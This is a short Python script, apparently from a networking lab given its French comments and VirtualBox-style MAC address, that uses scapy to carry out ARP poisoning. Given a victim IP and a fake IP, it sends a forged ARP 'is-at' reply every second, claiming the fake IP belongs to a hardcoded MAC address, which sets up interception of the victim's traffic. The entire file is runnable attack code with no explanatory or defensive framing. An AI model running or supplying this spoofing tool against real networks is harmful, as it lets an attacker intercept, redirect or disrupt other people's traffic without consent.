from scapy.all import *
import ipaddress
import argparse


# Arguments
parser = argparse.ArgumentParser(description="ARP poisoning")

parser.add_argument("victimeIp", help="Adresse IP de la victime")
parser.add_argument("fakeIp", help="Fake Ip")

args = parser.parse_args()


# Variables

victimeIp=args.victimeIp
fakeIp=args.fakeIp

while True:
    send(
        ARP(
            op="is-at",
            psrc=fakeIp, 
            pdst=victimeIp,
            hwdst = "ff:ff:ff:ff:ff:ff",
            hwsrc = "08:00:27:93:cf:20"
            )
        )
    time.sleep(1)



